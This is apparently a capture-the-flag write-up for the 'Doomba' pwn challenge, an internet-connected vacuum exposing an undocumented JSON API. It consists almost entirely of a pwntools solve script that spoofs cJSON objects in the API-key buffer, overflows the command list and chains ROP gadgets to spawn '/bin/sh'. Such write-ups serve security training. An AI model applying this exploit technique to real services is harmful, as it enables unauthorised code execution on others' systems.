# Doomba

## Question

> I purchased a brand-new internet connected vacuum. Turns out it has an open port with a undocumented API!  
> Connect with nc pwn.osucyber.club 13371

## Solution (by b01lers)

Unedited, super gross solve script.
The idea is to spoof cJSON chunks and overflow the list of commands.

``` 
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

apikey = 0x608120 # = 6324512

p = process('./pwn')
gdb.attach(p,"""
        #b 29
        #b 34
        b* 0x0000000000400cbd
        b * 0x400d44
        b* 0x400d3f
        c
        """)

p = remote('pwn.osucyber.club', 13371)

p.recvuntil(b"Please enter API key (5000 characters, super secure): ")

objectLength = 0x40

def spoofObject(nxt, child, typ, valueint=0x0, string=0x0):
    spoofedGoodObject = b""
    spoofedGoodObject += p64(nxt) # next
    spoofedGoodObject += p64(0x0) # prev
    spoofedGoodObject += p64(child) # child
    spoofedGoodObject += p32(typ) # type
    spoofedGoodObject += p32(0) # type

    spoofedGoodObject += p64(0x0) # valuestring
    spoofedGoodObject += p32(valueint) # valueint
    spoofedGoodObject += p32(0) # valueint

    spoofedGoodObject += p64(0) # valuedouble
    spoofedGoodObject += p64(string) # string

    print(hex(len(spoofedGoodObject)))

    return spoofedGoodObject

def spoofPassingObject(address, x, y, cmdId, nxt, xval=0, yval=0, idx=0):
    child1addr = address + objectLength
    child2addr = address + objectLength * 2
    child3addr = address + objectLength * 3

    child1 = spoofObject(child2addr, 0x0, 0x8, valueint=xval, string=x)
    child2 = spoofObject(child3addr, 0x0, 0x8, valueint=idx, string=cmdId)
    child3 = spoofObject(0x0, 0x0, 0x8, valueint=yval, string=y)

    data = spoofObject(nxt, child1addr, 0x40)

    return data + child1 + child2 + child3

def spoofChilds(address, x, y, cmdId):
    child1addr = address + objectLength
    child2addr = address + objectLength * 2
    child3addr = address + objectLength * 3

    child1 = spoofObject(child2addr, 0x0, 0x8, valueint=0x0, string=cmdId)
    child2 = spoofObject(child3addr, 0x0, 0x8, valueint=0x0, string=x)
    child3 = spoofObject(0x0, 0x0, 0x8, valueint=0x1, string=y)

    return child1 + child2 + child3

def spoofPassingObject2(address, x, y, cmdId):
    child1addr = address + objectLength
    child2addr = address + objectLength * 2
    child3addr = address + objectLength * 3

    child1 = spoofObject(child2addr, 0x0, 0x8, valueint=0, string=x)
    child2 = spoofObject(child3addr, 0x0, 0x8, valueint=0, string=cmdId)
    child3 = spoofObject(0x0, 0x0, 0x8, valueint=apikey+0x40, string=y)

    data = spoofObject(address, child1addr, 0x40)

    return data + child1 + child2 + child3


count = 0x10
yeeting_address = apikey + 24*(count-1)


payload = b''
payload += b'A' * 8 # next
payload += p64(0)
payload += p64(apikey+24 * 1) # 1st child
for i in range(2, count):
    payload += p64(apikey+24 * i) # next
    payload += p64(0) # prev
    if i == 0xe:
        payload += p64(yeeting_address+objectLength*4 + 0x10) # child -> same yeeting object
    if i == 0xf:
        payload += p64(0x0)
    else:
        payload += p64(yeeting_address+objectLength+8) # child -> same yeeting object

x_addr = yeeting_address + objectLength * 4 + 6 + 2
y_addr = yeeting_address + objectLength * 4 + 8 + 2
cmdid_addr = yeeting_address + objectLength * 4 + 2

payload += spoofPassingObject(yeeting_address, x_addr, y_addr, cmdid_addr)

payload += b'cmdId\x00'
payload += b'x\x00' # 6
payload += b'y\x00' # 8
payload += b'\x00\x00\x00\x00\x00\x00'
print(len(payload))
# yeeting_address + objectLength * 4 + 0x10
#payload += spoofObject(0x0, 0x0, 0x0)
payload += spoofPassingObject2(yeeting_address + objectLength * 4 + 0x10, x_addr, y_addr, cmdid_addr)
#payload += spoofChilds(yeeting_address + objectLength * 4 + 0x10, x_addr, y_addr, cmdid_addr)
payload += p64(0x0)
payload += p64(0x0)
payload += p64(0x0)

print(len(payload))


payload = b''
payload += b'/bin/sh\x00' # next
payload += p64(0)
payload += p64(apikey+24) # 1st child
payload += p64(apikey+32) # next
payload += p64(apikey+40) # prev
payload += p64(apikey+48) # child -> same yeeting object
payload += p64(apikey+56) # nxt points here
payload += p64(apikey+64)
payload += p64(apikey+72)
payload += p64(apikey+80)
payload += p64(apikey+88)
payload += p64(apikey+96)
payload += p64(apikey+104)
payload += p64(apikey+112)
x_addr = apikey + 112 + objectLength * 4 + 6
y_addr = apikey + 112 + objectLength * 4 + 8
cmdid_addr = apikey + 112 + objectLength * 4
payload += spoofPassingObject(apikey + 112, x_addr, y_addr, cmdid_addr, apikey + 112 + objectLength*4 + 16, xval=0, yval=0, idx=0)
payload += b'cmdId\x00' # apikey + objectLength * 4
payload += b'x\x00' # apikey + 6
payload += b'y\x00' # apikey + 8
payload += b'\x00\x00\x00\x00\x00\x00'
payload += spoofPassingObject(apikey + 112 + objectLength*4 + 16, x_addr, y_addr, cmdid_addr, apikey + 112 + 2*objectLength*4 + 16, xval=0, yval=0, idx=0xd) # 0xb: 11
payload += spoofPassingObject(apikey + 112 + 2*objectLength*4 + 16, x_addr, y_addr, cmdid_addr, apikey + 112 + 3*objectLength*4 + 16, xval=0, yval=apikey, idx=0x0000000000405b83 ) #  pop rdi
payload += spoofPassingObject(apikey + 112 + 3*objectLength*4 + 16, x_addr, y_addr, cmdid_addr, apikey + 112 + 4*objectLength*4 + 16, xval=0x00000000004008d6, yval=0, idx=0)
payload += spoofPassingObject(apikey + 112 + 4*objectLength*4 + 16, x_addr, y_addr, cmdid_addr, apikey + 112 + 5*objectLength*4 + 16, xval=0, yval=0, idx=0x00400950)
payload += spoofPassingObject(apikey + 112 + 5*objectLength*4 + 16, x_addr, y_addr, cmdid_addr, apikey + 112 + 6*objectLength*4 + 16, xval=4, yval=5, idx=0)
payload += spoofPassingObject(apikey + 112 + 6*objectLength*4 + 16, x_addr, y_addr, cmdid_addr, apikey + 112 + 7*objectLength*4 + 16, xval=0x00400950, yval=1, idx=1)
payload += spoofPassingObject(apikey + 112 + 7*objectLength*4 + 16, x_addr, y_addr, cmdid_addr, apikey + 112 + 8*objectLength*4 + 16, xval=1, yval=1, idx=1)
payload += spoofPassingObject(apikey + 112 + 8*objectLength*4 + 16, x_addr, y_addr, cmdid_addr, 0, xval=1, yval=1, idx=1)

while len(payload) < 4999:
    payload += b'n'

print(len(payload))
p.sendline(payload)

p.recvuntil(b"JSON > ")

payload = (b"""{
    "commands": [
        {"x": 0, "y": 0, "cmdId": 0},
        {"x": 0, "y": 0, "cmdId": 0},
        {"x": 0, "y": 0, "cmdId": 0},
        {"x": 0, "y": 0, "cmdId": 0},
        {"x": 0, "y": 0, "cmdId": 0},
        {"x": 0, "y": 0, "cmdId": 0},
        {"x": 0, "y": 0, "cmdId": 0},
        {"x": 0, "y": 0, "cmdId": 0},
        {"x": 0, "y": 0, "cmdId": 0},
        {"x": 1, "y": 1, "cmdId": 0},

        {"x": 6324512, "y": 0, "cmdId": 3},

        {"x": 6, "y": 2, "cmdId": 3},
        {"x": 7, "y": 2, "cmdId": 3},
        {"x": 8, "y": 2, "cmdId": 3},
        {"x": 9, "y": 2, "cmdId": 3},
        {"x": 255, "y": 2, "cmdId": 3},
        {"x": 11, "y": 2, "cmdId": 3},
        {"x": 12, "y": 2, "cmdId": 3}
    ]
}""").replace(b" ", b"").replace(b"\n", b"")

print(len(payload))

p.sendline(payload)
p.recvuntil("> ")
p.sendline("{}")

p.interactive()
```
